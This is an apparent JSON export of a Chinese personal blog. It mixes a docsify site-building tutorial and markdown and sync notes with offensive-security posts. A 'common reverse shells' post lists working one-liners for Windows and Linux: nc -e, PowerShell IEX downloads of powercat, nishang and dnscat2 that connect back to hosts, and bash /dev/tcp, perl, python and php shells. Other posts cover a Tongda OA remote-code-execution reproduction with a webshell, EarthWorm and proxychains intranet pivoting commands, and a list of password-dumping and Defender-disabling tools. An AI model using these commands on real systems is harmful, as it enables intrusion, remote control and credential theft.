&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&quot;&gt;&lt;&#x2F;script&gt; 接着在项目根目录创建_sidebar.md文件，内容格式如下： 1234* [home1](home1)* [home2](home2)* [bar](bar&#x2F;)* [bar&#x2F;a](bar&#x2F;a) 注：配置了loadSidebar后就不会生成默认的侧边栏了。 4.2 关于侧边栏_sidebar.md文件的说明 如果只在根目录有一个_sidebar.md文件，那么所有页面都将使用这个一个配置，也就是所有页面的侧边栏都一样。 如果一个子目录中有_sidebar.md文件，那么这个子目录下的所有页面将使用这个文件的侧边栏。 _sidebar.md的加载逻辑是从每层目录下获取文件，如果当前目录不存在该文件则回退到上一级目录。例如当前路径为/zh-cn/more-pages则从/zh-cn/_sidebar.md获取文件，如果不存在则从/_sidebar.md获取。 如果子目录有_sidebar.md,但你就想使用根目录的_sidebar.md，可在index.html文件中的window.$docsify添加alias字段： 12345678&lt;script&gt; window.$docsify &#x3D; &#123; loadSidebar: true, alias: &#123; &#39;&#x2F;.*&#x2F;_sidebar.md&#39;: &#39;&#x2F;_sidebar.md&#39; &#125; &#125;&lt;&#x2F;script&gt; 配置alias字段后，所有页面都会显示项目根目录_sidebar.md文件的配置作为侧边栏，子目录的_sidebar.md文件会失效。 4.3 显示页面目录(当前页面的标题)定制的侧边栏仅显示了页面的链接。还可以设置在侧边栏显示当前页面的目录(标题)。需要在index.html文件中的window.$docsify添加subMaxLevel字段来设置： 1234567&lt;script&gt; window.$docsify &#x3D; &#123; loadSidebar: true, subMaxLevel: 3 &#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&quot;&gt;&lt;&#x2F;script&gt; subMaxLevel 说明：subMaxLevel 类型是 number(数字)，表示显示的目录层级&gt; 注意：如果 md 文件中的第一个标题是一级标题，那么不会显示在侧边栏，如上图所示| 值 | 说明 || :— | :— || 0 | 默认值，表示不显示目录 || 1 | 显示一级标题(h1) || 2 | 显示一、二级标题(h1 ~ h2) || 3 | 显示一、二、三级标题(h1 ~ h3) || n | n 是数字，显示一、二、….n 级标题(h1 ~ hn) | 在 md 文件中标题的写法： 1234# 这是一级标题，对应HTML中&lt;h1&gt;标签## 这是二级标题，对应HTML中&lt;h2&gt;标签### 这是三级标题，对应HTML中&lt;h3&gt;标签#### 这是四级标题，对应HTML中&lt;h4&gt;标签 4.3.1 页面的标题不在侧边栏目录显示注意： 如果 md 文件的第一个标题是一级标题，那么默认已经忽略了。当设置了 subMaxLevel 时，默认情况下每个标题都会自动添加到目录中。如果你想忽略特定的标题，可以给它添加 {docsify-ignore} ： 123# Getting Started## Header &#123;docsify-ignore&#125;该标题不会出现在侧边栏的目录中。 要忽略特定页面上的所有标题，你可以在页面的第一个标题上使用 {docsify-ignore-all} : 123# Getting Started &#123;docsify-ignore-all&#125;## Header该页面所有标题都不会出现在侧边栏的目录中。 在使用时， {docsify-ignore} 和 {docsify-ignore-all} 都不会在页面上显示。 5. 导航栏配置docsify 默认是没有导航栏的，可以通过配置来显示导航栏。 5.1 在index.html中定义导航栏如果导航的链接少，则可以直接在index.html文件直接定义导航栏，要注意链接要以#/开头： 1234567&lt;body&gt; &lt;nav&gt; &lt;a href&#x3D;&quot;#&#x2F;&quot;&gt;项目&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;#&#x2F;home1&quot;&gt;home1&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;#&#x2F;bar&#x2F;a&quot;&gt;bar&#x2F;a&lt;&#x2F;a&gt; &lt;&#x2F;nav&gt;&lt;&#x2F;body&gt; 5.2 通过配置文件定义导航栏首先需要在index.html文件中的window.$docsify添加loadNavbar: true,选项： 123456&lt;script&gt; window.$docsify &#x3D; &#123; loadNavbar: true &#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&quot;&gt;&lt;&#x2F;script&gt; 接着在项目根目录创建_navbar.md文件，内容格式如下： 1234* [home1](home1)* [home2](home2)* [bar](bar&#x2F;)* [bar&#x2F;a](bar&#x2F;a) 注意：1.如果使用配置文件来设置导航栏，那么在&gt; index.html中定义的导航栏只有在定制的首页才会生效，其他页面会被覆盖。2.如果只在根目录有一个&gt; _navbar.md文件，那么所有页面都将使用这个一个配置，也就是所有页面的导航栏都一样。3.如果一个子目录中有&gt; _navbar.md文件，那么这个子目录下的所有页面将使用这个文件的导航栏。4.&gt; _navbar.md的加载逻辑是从每层目录下获取文件，如果当前目录不存在该文件则回退到上一级目录。例如当前路径为&gt; /zh-cn/more-pages则从&gt; /zh-cn/_navbar.md获取文件，如果不存在则从&gt; /_navbar.md获取。 5.3 导航栏嵌套如果导航内容过多，可以写成嵌套的列表，会被渲染成下拉列表的形式： 12345678910* 根目录 * [home1](home1) * [home2](home2) * [guide](guide)* bar目录 * [bar](bar&#x2F;) * [a文件](bar&#x2F;a) * [b文件](bar&#x2F;b)* foo目录 * [one](foo&#x2F;one) 6. 设置封面docsify 默认是没有封面的，默认有个首页./README.md。通过设置coverpage参数，可以开启渲染封面的功能。首先需要在index.html文件中的window.$docsify添加coverpage: true选项： 123456&lt;script&gt; window.$docsify &#x3D; &#123; coverpage: true &#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&quot;&gt;&lt;&#x2F;script&gt; 接着在项目根目录创建_coverpage.md文件，内容格式如下： 12345678910![logo](_media&#x2F;icon.svg)# 我的文档网站## 个人文档网站&gt; 一个神奇的文档网站生成巩固* Simple and lightweight (~12kb gzipped)* Multiple themes* Not build static html files[GitHub](https:&#x2F;&#x2F;github.com&#x2F;docsifyjs&#x2F;docsify&#x2F;)[Get Started](#quick-start)[Get Started](#quick-start) 注：一份文档只会在根目录下加载封面，其他页面或者二级目录下都不会加载。 6.1 自定义封面背景目前的背景是随机生成的渐变色，每次刷新都会显示不同的颜色。docsify 封面支持自定义背景色或者背景图，在_coverpage.md文档末尾添加： 1234&lt;!-- 背景图片 --&gt;![](_media&#x2F;bg.png)&lt;!-- 背景色 --&gt;![color](#2f4253) 注意：1.自定义背景配置一定要在&gt; _coverpage.md文档末尾。2.背景图片和背景色只能有一个生效.3.背景色一定要是&gt; #2f4253这种格式的。 6.2 把封面作为首页配置了封面后，封面和首页是同时出现的，封面在上面，首页在下面。通过设置onlyCover参数，可以让 docsify 网站首页只显示封面，原来的首页通过http://localhost:3000/#/README访问。在index.html文件中的window.$docsify添加onlyCover: true,选项： 1234567&lt;script&gt; window.$docsify &#x3D; &#123; coverpage: true, onlyCover: true, &#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;.&#x2F;docsify.min.js&quot;&gt;&lt;&#x2F;script&gt; 通过此配置可以把&gt; ./README.md文件独立出来，当成项目真正的 README 介绍文件。 6.3 多个封面如果你的文档网站是多语言的，或许你需要设置多个封面。例如你的文档目录结构如下 123456789.└── docs ├── README.md ├── guide.md ├── _coverpage.md └── zh-cn ├── README.md └── guide.md └── _coverpage.md 那么你可以在index.html文件中的window.$docsify这么配置: 123window.$docsify &#x3D; &#123; coverpage: [&#39;&#x2F;&#39;, &#39;&#x2F;zh-cn&#x2F;&#39;]&#125;; 或者具体指名文件名: 123456window.$docsify &#x3D; &#123; coverpage: &#123; &#39;&#x2F;&#39;: &#39;cover.md&#39;, &#39;&#x2F;zh-cn&#x2F;&#39;: &#39;cover.md&#39; &#125;&#125;; 7. 网站部署到 GitHub PagesGitHub Pages 支持从三个地方读取文件:1、&gt; master分支 2、&gt; master分支下的&gt; docs目录 3、&gt; gh-pages分支 1、如果你的文档直接是在项目根目录写的，那么可直接把代码推送到 master 分支上， &gt; GitHub Pages里选择&gt; master branch.2.如果你的文档是在 master 分支下的&gt; docs/目录下编写的，那么可直接把代码推送到 master 分支上，&gt; GitHub Pages里选择&gt; master branch/docs folder.本例子项目是直接在根目录中编写的，所以GitHub Pages里选择master branch的方式部署。首先在 github 网站上创建好仓库，然后终端打开项目目录： 12345git initgit add .git commit -m &#39;docsify项目初始化&#39;git remote add origin https:&#x2F;&#x2F;github.com&#x2F;username&#x2F;docsify.gitgit push --set-upstream origin master 代码推送到 github 上后，打开 github 的仓库，选择Settings -&gt; GitHub Pages -&gt; master branch -&gt; save。 7.1 使用 docsify 的例子https://spiritree.github.io/n…https://ripperhe.com/awesome-… 8. 一些插件8.1 搜索插件全文搜索插件会根据当前页面上的超链接获取文档内容，在 localStorage 内建立文档索引。默认过期时间为一天，当然我们可以自己指定需要缓存的文件列表或者配置过期时间。 12345678910111213141516171819202122&lt;script&gt; window.$docsify &#x3D; &#123; &#x2F;&#x2F; 完整配置参数 search: &#123; maxAge: 86400000, &#x2F;&#x2F; 过期时间，单位毫秒，默认一天 paths: [], &#x2F;&#x2F; or &#39;auto&#39;，匹配文件路径 placeholder: &#39;Type to search&#39;, &#x2F;&#x2F; 搜索提示框文字， 支持本地化，例子在下面 &#x2F;&#x2F; placeholder: &#123; &#x2F;&#x2F; &#39;&#x2F;zh-cn&#x2F;&#39;: &#39;搜索&#39;, &#x2F;&#x2F; &#39;&#x2F;&#39;: &#39;Type to search&#39; &#x2F;&#x2F; &#125;, noData: &#39;No Results!&#39;, &#x2F;&#x2F; 找不到结果文字提示，支持本地化，例子在下面 &#x2F;&#x2F; noData: &#123; &#x2F;&#x2F; &#39;&#x2F;zh-cn&#x2F;&#39;: &#39;找不到结果&#39;, &#x2F;&#x2F; &#39;&#x2F;&#39;: &#39;No Results&#39; &#x2F;&#x2F; &#125;, depth: 2, &#x2F;&#x2F; 搜索标题的最大程级, 1 - 6 &#125; &#125; &lt;&#x2F;script&gt; &lt;!-- 引入搜索模块 --&gt; &lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&#x2F;lib&#x2F;plugins&#x2F;search.js&quot;&gt;&lt;&#x2F;script&gt; 8.2 评论插件 GitalkGitalk：一个现代化的，基于 Preact 和 Github Issue 的评论系统。使用例子： 1234567891011121314&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;gitalk&#x2F;dist&#x2F;gitalk.css&quot;&gt;&lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&#x2F;lib&#x2F;plugins&#x2F;gitalk.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;gitalk&#x2F;dist&#x2F;gitalk.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt; const gitalk &#x3D; new Gitalk(&#123; clientID: &#39;Github Application Client ID&#39;, clientSecret: &#39;Github Application Client Secret&#39;, repo: &#39;Github repo&#39;, owner: &#39;Github repo owner&#39;, admin: [&#39;Github repo collaborators, only these guys can initialize github issues&#39;], &#x2F;&#x2F; facebook-like distraction free mode distractionFreeMode: false &#125;)&lt;&#x2F;script&gt; Gitalk 具体使用教程：https://segmentfault.com/a/11…docsify 其他插件：https://docsify.js.org/#/zh-c… 8.3 样式插件在网上找到一个样式：https://jhildenbiddle.github….使用方法,在 HTML 文件中引入： 1&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;docsify-themeable@0&#x2F;dist&#x2F;css&#x2F;theme-simple.css&quot;&gt; 参考资料docsify 中文官网：https://docsify.js.org/#/zh-cn/ ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"通达OA","slug":"tongda","date":"2020-08-29T04:59:08.000Z","updated":"2020-09-16T08:58:45.096Z","comments":true,"path":"2020/08/29/tongda/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/29/tongda/","excerpt":"","text":"影响版本12通达OA&lt;v11.5&amp;v11.6版本&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php （仅限于11.6存在，可以借此判断版本） 漏洞搭建 直接运行 EXE 程序 访问：admin/密码为空 image-20200829114515576 漏洞复现 TongdaRCE-master image-20200829115513134 并且返回了 shell 现在通过 admin/为空成功登录以后 image-20200829115235899 通过冰蝎连接（密码为 pass） image-20200829115912630 命令执行好像存在点问题 不过可以通过此处修改 shell image-20200829120022305 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"常用反弹shell","slug":"fantanshell","date":"2020-08-29T03:12:41.000Z","updated":"2020-09-16T08:58:45.104Z","comments":true,"path":"2020/08/29/fantanshell/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/","excerpt":"","text":"附件 powercat.ps1 链接：https://pan.baidu.com/s/1jXtHBNjy224RJPbojvNFZA提取码：x6gx windowsnc1nc -e cmd.exe 192.168.31.86 1234 powercat1powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;http:&#x2F;&#x2F;122.51.93.116:8080&#x2F;powercat.ps1&#39;);powercat -c 122.51.93.116 -p 1234 -e cmd.exe msf1略 cobalt strike1攻击--生成后门--Windows Executable（s）--输出powershell--目标机执行命令 Empire1234usestager windows&#x2F;launcher_vbsinfoset Listener testexecute nishangInvoke-PowerShellTcp_2.ps1 1powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.210 -port 1234 Invoke-PowerShellUdp.ps1 12powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.210 -port 1234 Dnscat1234服务端：ruby dnscat2.rb --dns &quot;domain&#x3D;lltest.com,host&#x3D;xx.xx.xx.xx&quot; --no-cache -e open -e open目标主机：powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx liunxbashTCP1234nc -lvp 1234bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.8.106&#x2F;1234 0&gt;&amp;1 #适合redhat系列,不建议用exec,兼容性并不好&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.212&#x2F;1234 0&lt;&amp; 2&gt;&amp;1 UDP12nc -u -lvp 1234 # -u表示采用udp监听sh -i &gt;&amp; &#x2F;dev&#x2F;udp&#x2F;192.168.31.192&#x2F;1234 0&gt;&amp;1 telnet12延迟片刻，等1234和1235均产生内容了在1234输入命令，在1235输出内容telnet 192.168.31.192 1234 | &#x2F;bin&#x2F;bash | telnet 192.168.31.192 1235 perl1perl -e &#39;use Socket;$i&#x3D;&quot;192.168.8.106&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; python1python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.99.242&#39;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; php1php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.99.242&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 来源反弹编码 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"内网渗透-流量转发","slug":"ew","date":"2020-08-28T09:11:09.000Z","updated":"2020-09-16T08:58:45.132Z","comments":true,"path":"2020/08/28/ew/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/28/ew/","excerpt":"","text":"工具 Earthworm Termite reGeorg nps 环境配置 A1 - 公网攻击服务器(120.x.x.x) V1 - 出网的内网服务器(192.168.31.193/192.158.15.10 - win7 ，80 端口存在 web 应用，通过一台花生壳对公网开放，现已获得 webshell，路由可抵达 192.168.15 段。) V2 - 不出网的内网服务器(192.168.15.20 - win xp ，不对公网开放，路由可抵达 192.168.15.0 段) 环境配置 已获取 V1 的 webshell，并反弹到 A1 上。 操作 反弹的六种模式 ssocksd - 正向代理 rcsocks - 反向代理 1，流量转发 rssocks - 反向代理 2，反弹 socks5 lcx_listen - 反向代理 1，流量转发 lcx_tran - 端口转发 lcx_slave - 端口绑定 出外网 正向代理 反向代理 A1 12原理：由于场景中目标机V1没有公网IP，但是能访问公网。无法使用正向连接，可使用反弹连接的方式代理流量。 12在攻击机A1本地启动流量转发，将来自外部1080端口的流量转发到本地8888端口，并等待目标反弹连接：.&#x2F;ew -s rcsocks -l 1080 -e 8888 V1 12在目标机V1上启动socks5服务，并反弹到攻击机A1的8888端口： .&#x2F;ew -s rssocks -d 122.51.93.116 -e 8888 然后可以看到 A1 中出现rssocks cmd_socket OK!表示流量转发成功 A1 123456789101112apt install proxychains&#x2F;&#x2F;proxychains安装vi &#x2F;etc&#x2F;proxychains.conf &#x2F;&#x2F;proxychains代理配置 [ProxyList] socks5 122.51.93.116 1080 &#x2F;&#x2F;proxychains代理配置 proxychains nmap -sT -Pn -open 192.168.1.1&#x2F;16 &#x2F;&#x2F;由于proxychains无法代理icmp的数据包，要加上禁ping参数-Pn（不检测主机是否存活，直接进行端口tcp扫描） 扫描结果发现仅能抵达 10.2 段内网机器 V2-10.10.2.111，开放了 22 以及其他端口尝试对 V2 进行渗透，在 V1 上发现已设置了 V2 的免密登录，在之前 V1 反弹的 shell 中用 ssh 成功登录到 V2。 不出外网现已获得V2的shell，检查发现V2不通公网，无法反向代理公网流量，需要通过V1进行多级代理。接下来将流量代理到V2上进行进一步探测。这里同样有两种方式：正向代理和反向代理。 正向代理 反向代理 123在攻击机A1本地启动流量转发，将来自外部1080端口的流量转发到本地8888端口，并等待目标反弹连接：.&#x2F;ew -s lcx_listen -l 1080 -e 8888 123传输ew到V2上，在V2启动socks5代理并监听9999端口：.&#x2F;ew -s ssocksd -l 9999最后在V1执行，将A1的8888端口与V2的9999端口绑定，建立socks5通道： 12.&#x2F;ew -s lcx_slave -d 120.x.x.x -e 8888 -f 10.10.2.111 -g 9999A1上proxychains代理配置： 1234[ProxyList]socks5 0.0.0.0 1080&#x2F;&#x2F;proxychains代理配置proxychains nmap -p xxx -sT -Pn -open 10.10.2.111&#x2F;16 proxychains 配置详解123456789101112ProxyList配置socks5 192.168.67.78 1080http 192.168.89.3 8080socks4 192.168.1.49 1080#设置超时时间tcp_read_time_out 15000tcp_connect_time_out 8000基本使用proxychains xxxx 文章来源 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"markdown语法","slug":"dasd","date":"2020-08-28T05:41:05.000Z","updated":"2020-09-16T08:58:45.148Z","comments":true,"path":"2020/08/28/dasd/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/28/dasd/","excerpt":"","text":"1234567891011121314151617181920212223242526# 设置标题​&#96;&#96;&#96;多行代码块​&#96;&#96;&#96;&#96;&#96;单行代码块&#96;数字. 有序数列- 无序数列[xxx](xxx) 超链接&gt; 引用--- 分割线~删除的文字~***斜体加粗*****加粗****斜体* ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"附件集合","slug":"baiduyun","date":"2020-08-27T08:22:42.000Z","updated":"2020-09-16T08:58:45.192Z","comments":true,"path":"2020/08/27/baiduyun/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/27/baiduyun/","excerpt":"","text":"打包百度云 Wireshark抓包全集（85种协议、类别的抓包文件）webshellxshell密码读取（Xdecrypt.exe） image-20200827163616095 clash老毛子全国手机号生成2.0awvs13 中文版-天翼云盘Xray_Rad_Fusion一键开启关闭Windows DefenderTermiteEarthWorm/EWhere(免杀)HskDDNS_5.1.1.30645（花生壳）TongdaRCE-masterLaZagne——windows系统所有密码读取内网扫描工具 Ladon7.0 EternalBlues （ms17010快速检测工具图形版） url-survival-check-master URL可用性检测pscan24.exe 局域网扫描软件 image-20200914233854773 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"瓦雀保存中文","slug":"washou","date":"2020-08-27T06:40:00.000Z","updated":"2020-09-16T08:58:45.220Z","comments":true,"path":"2020/08/27/washou/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/27/washou/","excerpt":"","text":"瓦雀对 markdown 语法做了一些扩展： 文档设置通过 markdown 前的 yaml 来设置文档，目前支持三个属性： url - 文档 url，如果不设置瓦雀默认会用文件名作为 url。 public - 浏览权限，1 是公开，0 是私密。 template - 是否启用模板功能，优先级高于 yuque.yml 中的设置。 123456---url: hello-worldpublic: 1---# Hello world 无法保存 请通过 notepad++ 进行复制粘贴针对命名正确，但是仍然无法提示错误请重新复制 1234---url: Ladonpublic: 1--- 一份通过 image-20200913230903725 瓦雀 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"瓦雀同步","slug":"wq","date":"2020-08-27T06:12:31.000Z","updated":"2020-09-16T08:58:45.236Z","comments":true,"path":"2020/08/27/wq/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/27/wq/","excerpt":"","text":"下载下载typoral picgo waque123456789101112131415161718192021安装瓦雀npm i -g waque登录语雀waque login初始化配置waque init上传文档waque upload #同步全部waque upload foo.md bar.md #同步指定的内容自定义上传文件名(可以解决本地不能使用中文命名的问题)---url: hello-worldpublic: 1---# Hello world github 新建仓库 生成 token picgo image-20200827110403737 typoral​ 配置 typoral 瓦雀同步命名出错问题 瓦雀本地保存中文导致无法同步到语雀 写入 md 文件头部，然后通过 notepad++打开然后在首页加入即可，并且 url 名称得用小写字母 image-20200827142825264 一定是因为 md 头部没复制好 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]}],"categories":[],"tags":[]}